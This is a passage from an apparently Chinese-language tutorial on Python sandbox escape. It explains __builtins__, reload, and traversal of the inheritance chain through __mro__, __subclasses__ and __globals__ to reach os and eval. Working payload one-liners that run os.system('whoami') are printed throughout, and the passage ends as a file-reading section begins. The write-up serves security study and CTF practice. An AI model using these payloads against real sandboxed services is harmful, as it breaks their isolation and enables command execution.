才能查看：</p><p>2.x：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> __builtin__<br><span class="hljs-meta">&gt;&gt;&gt; </span>__builtin__<br>&lt;module <span class="hljs-string">&#x27;__builtin__&#x27;</span> (built-<span class="hljs-keyword">in</span>)&gt;<br></code></pre></td></tr></table></figure><p>3.x：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> builtins<br><span class="hljs-meta">&gt;&gt;&gt; </span>builtins<br>&lt;module <span class="hljs-string">&#x27;builtins&#x27;</span> (built-<span class="hljs-keyword">in</span>)&gt;<br></code></pre></td></tr></table></figure><p>但是，<code>__builtins__</code> 两者都有，实际上是<code>__builtin__</code>和<code>builtins</code> 的引用。它不需要导入，我估计是为了统一 <code>2.x</code> 和 <code>3.x</code>。不过<code>__builtins__</code>与<code>__builtin__</code>和<code>builtins</code>是有一点区别的，感兴趣的话建议查一下，这里就不啰嗦了。不管怎么样，<code>__builtins__</code> 相对实用一点，并且在 <code>__builtins__</code>里有很多好东西：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;__import__&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(__builtins__)<br>-------------------------------------<br>__builtins__.__dict__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>-------------------------------------<br><span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(__builtins__)<br>-------------------------------------<br><span class="hljs-string">&#x27;execfile&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(__builtins__)<br></code></pre></td></tr></table></figure><p>那么既然<code>__builtins__</code>有这么多危险的函数，不如将里面的危险函数破坏了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">__builtins__.__dict__[<span class="hljs-string">&#x27;eval&#x27;</span>] = <span class="hljs-string">&#x27;not allowed&#x27;</span><br></code></pre></td></tr></table></figure><p>或者直接删了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">del</span> __builtins__.__dict__[<span class="hljs-string">&#x27;eval&#x27;</span>]<br></code></pre></td></tr></table></figure><p>但是我们可以利用 <code>reload(__builtins__)</code> 来恢复 <code>__builtins__</code>。不过，我们在使用 <code>reload</code> 的时候也没导入，说明<code>reload</code>也在 <code>__builtins__</code>里，那如果连<code>reload</code>都从<code>__builtins__</code>中删了，就没法恢复<code>__builtins__</code>了，需要另寻他法。还有一种情况是利用 <code>exec command in _global</code> 动态运行语句时的绕过，比如实现一个计算器的时候，在最后有给出例子。</p><p>这里注意，2.x 的 <code>reload</code> 是内建的，3.x 需要 <code>import imp</code>，然后再 <code>imp.reload</code>。你看，reload 的参数是 <code>module</code>，所以肯定还能用于重新载入其他模块，这个放在下面说。</p><h3 id="通过继承关系逃逸">通过继承关系逃逸</h3><p>在 Python 中提到继承就不得不提 <code>mro</code>，<code>mro</code>就是方法解析顺序，因为 Python 支持多重继承，所以就必须有个方式判断某个方法到底是 A 的还是 B 的。2.2 之前是经典类，搜索是深度优先；经典类后来发展为新式类，使用广度优先搜索，再后来新式类的搜索变为 C3 算法；而 3.x 中新式类一统江湖，默认继承 <code>object</code>，当然也是使用的 C3 搜索算法。。。扯远了扯远了，感兴趣的可以搜搜。不管怎么说，总是让人去判断继承关系显然是反人类的，所以 Python 中新式类都有个属性，叫<code>__mro__</code>，是个元组，记录了继承关系：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__<br>(&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">str</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">object</span>&#x27;&gt;)</span><br></code></pre></td></tr></table></figure><p>类的实例在获取 <code>__class__</code> 属性时会指向该实例对应的类。可以看到，<code>''</code>属于 <code>str</code>类，它继承了 <code>object</code> 类，这个类是所有类的超类。具有相同功能的还有<code>__base__</code>和<code>__bases__</code>。需要注意的是，经典类需要指明继承 object 才会继承它，否则是不会继承的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span>:</span><br><span class="hljs-meta">... </span>    <span class="hljs-keyword">pass</span><br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>test.__bases__<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br><span class="hljs-meta">... </span>    <span class="hljs-keyword">pass</span><br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>test.__bases__<br>(&lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;,)<br></code></pre></td></tr></table></figure><p>那么知道这个有什么用呢？</p><p>由于没法直接引入 os，那么假如有个库叫<code>oos</code>，在<code>oos</code>中引入了<code>os</code>，那么我们就可以通过<code>__globals__</code>拿到 os（<code>__globals__</code>是函数所在的全局命名空间中所定义的全局变量）。例如，<code>site</code> 这个库就有 <code>os</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> site<br>site.os<br></code></pre></td></tr></table></figure><p>也就是说，能引入 site 的话，就相当于有 os。那如果 site 也被禁用了呢？没事，本来也就没打算直接 <code>import site</code>。可以利用 <code>reload</code>，变相加载 <code>os</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> site<br><span class="hljs-meta">&gt;&gt;&gt; </span>os<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>NameError: name <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> defined<br><span class="hljs-meta">&gt;&gt;&gt; </span>os = reload(site.os)<br><span class="hljs-meta">&gt;&gt;&gt; </span>os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>还有，既然所有的类都继承的<code>object</code>，那么我们先用<code>__subclasses__</code>看看它的子类，以 2.x 为例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()): <span class="hljs-built_in">print</span> i<br>...<br>(<span class="hljs-number">0</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;)<br>(<span class="hljs-number">1</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;)<br>(<span class="hljs-number">2</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;)<br>(<span class="hljs-number">3</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;)<br>(<span class="hljs-number">4</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;)<br>(<span class="hljs-number">5</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;)<br>(<span class="hljs-number">6</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;)<br>(<span class="hljs-number">7</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;)<br>(<span class="hljs-number">8</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NoneType&#x27;</span>&gt;)<br>(<span class="hljs-number">9</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NotImplementedType&#x27;</span>&gt;)<br>(<span class="hljs-number">10</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;traceback&#x27;</span>&gt;)<br>(<span class="hljs-number">11</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;super&#x27;</span>&gt;)<br>(<span class="hljs-number">12</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;xrange&#x27;</span>&gt;)<br>(<span class="hljs-number">13</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;)<br>(<span class="hljs-number">14</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;set&#x27;</span>&gt;)<br>(<span class="hljs-number">15</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;slice&#x27;</span>&gt;)<br>(<span class="hljs-number">16</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;staticmethod&#x27;</span>&gt;)<br>(<span class="hljs-number">17</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;complex&#x27;</span>&gt;)<br>(<span class="hljs-number">18</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;float&#x27;</span>&gt;)<br>(<span class="hljs-number">19</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;buffer&#x27;</span>&gt;)<br>(<span class="hljs-number">20</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;long&#x27;</span>&gt;)<br>(<span class="hljs-number">21</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frozenset&#x27;</span>&gt;)<br>(<span class="hljs-number">22</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;property&#x27;</span>&gt;)<br>(<span class="hljs-number">23</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;memoryview&#x27;</span>&gt;)<br>(<span class="hljs-number">24</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;)<br>(<span class="hljs-number">25</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;enumerate&#x27;</span>&gt;)<br>(<span class="hljs-number">26</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;reversed&#x27;</span>&gt;)<br>(<span class="hljs-number">27</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;code&#x27;</span>&gt;)<br>(<span class="hljs-number">28</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frame&#x27;</span>&gt;)<br>(<span class="hljs-number">29</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;builtin_function_or_method&#x27;</span>&gt;)<br>(<span class="hljs-number">30</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instancemethod&#x27;</span>&gt;)<br>(<span class="hljs-number">31</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;function&#x27;</span>&gt;)<br>(<span class="hljs-number">32</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classobj&#x27;</span>&gt;)<br>(<span class="hljs-number">33</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dictproxy&#x27;</span>&gt;)<br>(<span class="hljs-number">34</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;generator&#x27;</span>&gt;)<br>(<span class="hljs-number">35</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;getset_descriptor&#x27;</span>&gt;)<br>(<span class="hljs-number">36</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;wrapper_descriptor&#x27;</span>&gt;)<br>(<span class="hljs-number">37</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instance&#x27;</span>&gt;)<br>(<span class="hljs-number">38</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;ellipsis&#x27;</span>&gt;)<br>(<span class="hljs-number">39</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;member_descriptor&#x27;</span>&gt;)<br>(<span class="hljs-number">40</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;file&#x27;</span>&gt;)<br>(<span class="hljs-number">41</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;PyCapsule&#x27;</span>&gt;)<br>(<span class="hljs-number">42</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cell&#x27;</span>&gt;)<br>(<span class="hljs-number">43</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;callable-iterator&#x27;</span>&gt;)<br>(<span class="hljs-number">44</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;iterator&#x27;</span>&gt;)<br>(<span class="hljs-number">45</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.long_info&#x27;</span>&gt;)<br>(<span class="hljs-number">46</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.float_info&#x27;</span>&gt;)<br>(<span class="hljs-number">47</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;EncodingMap&#x27;</span>&gt;)<br>(<span class="hljs-number">48</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;fieldnameiterator&#x27;</span>&gt;)<br>(<span class="hljs-number">49</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;formatteriterator&#x27;</span>&gt;)<br>(<span class="hljs-number">50</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.version_info&#x27;</span>&gt;)<br>(<span class="hljs-number">51</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.flags&#x27;</span>&gt;)<br>(<span class="hljs-number">52</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;exceptions.BaseException&#x27;</span>&gt;)<br>(<span class="hljs-number">53</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;module&#x27;</span>&gt;)<br>(<span class="hljs-number">54</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;imp.NullImporter&#x27;</span>&gt;)<br>(<span class="hljs-number">55</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;zipimport.zipimporter&#x27;</span>&gt;)<br>(<span class="hljs-number">56</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.stat_result&#x27;</span>&gt;)<br>(<span class="hljs-number">57</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.statvfs_result&#x27;</span>&gt;)<br>(<span class="hljs-number">58</span>, &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">warnings</span>.<span class="hljs-title">WarningMessage</span>&#x27;&gt;)</span><br><span class="hljs-class">(<span class="hljs-params"><span class="hljs-number">59</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;</span>)</span><br><span class="hljs-class">(<span class="hljs-params"><span class="hljs-number">60</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;</span>)</span><br><span class="hljs-class">(<span class="hljs-params"><span class="hljs-number">61</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;</span>)</span><br><span class="hljs-class">(<span class="hljs-params"><span class="hljs-number">62</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Hashable&#x27;</span>&gt;</span>)</span><br><span class="hljs-class">(<span class="hljs-params"><span class="hljs-number">63</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classmethod&#x27;</span>&gt;</span>)</span><br><span class="hljs-class">(<span class="hljs-params"><span class="hljs-number">64</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Iterable&#x27;</span>&gt;</span>)</span><br><span class="hljs-class">(<span class="hljs-params"><span class="hljs-number">65</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Sized&#x27;</span>&gt;</span>)</span><br><span class="hljs-class">(<span class="hljs-params"><span class="hljs-number">66</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Container&#x27;</span>&gt;</span>)</span><br><span class="hljs-class">(<span class="hljs-params"><span class="hljs-number">67</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Callable&#x27;</span>&gt;</span>)</span><br><span class="hljs-class">(<span class="hljs-params"><span class="hljs-number">68</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;</span>)</span><br><span class="hljs-class">(<span class="hljs-params"><span class="hljs-number">69</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;</span>)</span><br><span class="hljs-class">(<span class="hljs-params"><span class="hljs-number">70</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;</span>)</span><br><span class="hljs-class">(<span class="hljs-params"><span class="hljs-number">71</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;</span>)</span><br><span class="hljs-class">(<span class="hljs-params"><span class="hljs-number">72</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Helper&#x27;</span>&gt;</span>)</span><br><span class="hljs-class">(<span class="hljs-params"><span class="hljs-number">73</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;</span>)</span><br><span class="hljs-class">(<span class="hljs-params"><span class="hljs-number">74</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Match&#x27;</span>&gt;</span>)</span><br><span class="hljs-class">(<span class="hljs-params"><span class="hljs-number">75</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;</span>)</span><br><span class="hljs-class">(<span class="hljs-params"><span class="hljs-number">76</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;</span>)</span><br><span class="hljs-class">(<span class="hljs-params"><span class="hljs-number">77</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;</span>)</span><br><span class="hljs-class">(<span class="hljs-params"><span class="hljs-number">78</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;</span>)</span><br></code></pre></td></tr></table></figure><p>可以看到，site 就在里面，以 2.x 的<code>site._Printer</code>为例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">71</span>]._Printer__setup.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>]<br></code></pre></td></tr></table></figure><p>os 又回来了。并且 site 中还有 <code>__builtins__</code>。</p><p>这个方法不仅限于 <code>A-&gt;os</code>，还可以是 <code>A-&gt;B-&gt;os</code>，比如 <code>2.x</code> 中的 <code>warnings</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> warnings<br><span class="hljs-meta">&gt;&gt;&gt; </span><br><span class="hljs-meta">&gt;&gt;&gt; </span>warnings.os<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>AttributeError: <span class="hljs-string">&#x27;module&#x27;</span> <span class="hljs-built_in">object</span> has no attribute <span class="hljs-string">&#x27;os&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>warnings.linecache<span class="hljs-comment"># | 导入成功</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>warnings.linecache.os        <span class="hljs-comment"># | 导入成功</span><br></code></pre></td></tr></table></figure><p>在继承链中就可以这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>顺便说一下，<code>warnings</code>这个库中有个函数：<code>warnings.catch_warnings</code>，它有个<code>_module</code>属性：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, record=<span class="hljs-literal">False</span>, module=<span class="hljs-literal">None</span></span>):</span><br>...<br>        self._module = sys.modules[<span class="hljs-string">&#x27;warnings&#x27;</span>] <span class="hljs-keyword">if</span> module <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> module<br>...<br></code></pre></td></tr></table></figure><p>所以通过<code>_module</code>也可以构造 payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>).__class__.__base__.__subclasses__() <span class="hljs-keyword">if</span> x.__name__ == <span class="hljs-string">&#x27;catch_warnings&#x27;</span>][<span class="hljs-number">0</span>]()._module.linecache.os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>3.x 中的<code>warnings</code>虽然没有 <code>linecache</code>，也有<code>__builtins__</code>。</p><p>同样，py3.x 中有<code>&lt;class 'os._wrap_close'&gt;</code>，利用方式可以为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">117</span>].__init__.__globals__[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>顺便提一下，<code>object</code> 本来就是可以使用的，如果没过滤这个变量的话，payload 可以简化为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">117</span>].__init__.__globals__[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>还有一种是利用<code>builtin_function_or_method</code> 的 <code>__call__</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">29</span>].__call__(<span class="hljs-built_in">eval</span>, <span class="hljs-string">&#x27;1+1&#x27;</span>)<br></code></pre></td></tr></table></figure><p>或者简单一点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[].__getattribute__(<span class="hljs-string">&#x27;append&#x27;</span>).__class__.__call__(<span class="hljs-built_in">eval</span>, <span class="hljs-string">&#x27;1+1&#x27;</span>)<br></code></pre></td></tr></table></figure><p>还可以这样利用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-built_in">dict</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">super</span>(test, self).keys.__class__.__call__(<span class="hljs-built_in">eval</span>, <span class="hljs-string">&#x27;1+1&#x27;</span>))<br>        <span class="hljs-comment"># 如果是 3.x 的话可以简写为：</span><br>        <span class="hljs-comment"># super().keys.__class__.__call__(eval, &#x27;1+1&#x27;))</span><br>test()<br></code></pre></td></tr></table></figure><p>上面的这些利用方式总结起来就是通过<code>__class__</code>、<code>__mro__</code>、<code>__subclasses__</code>、<code>__bases__</code>等等属性/方法去获取 <code>object</code>，再根据<code>__globals__</code>找引入的<code>__builtins__</code>或者<code>eval</code>等等能够直接被利用的库，或者找到<code>builtin_function_or_method</code>类/类型<code>__call__</code>后直接运行<code>eval</code>。</p><p>最后，继承链的逃逸还有一些利用第三方库的方式，比如 <code>jinja2</code>，这类利用方式应该是叫 <code>SSTI</code>，可以看这个：<a href="https://0day.work/jinja2-template-injection-filter-bypasses/">传送门</a>，这里就不多说了。</p><h2 id="文件读写">文件读写</h2><p>2.x 有个内建的 <code>file</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>file(<span class="hljs-string">&#x27;key&#x27;</span>).read()<br><span 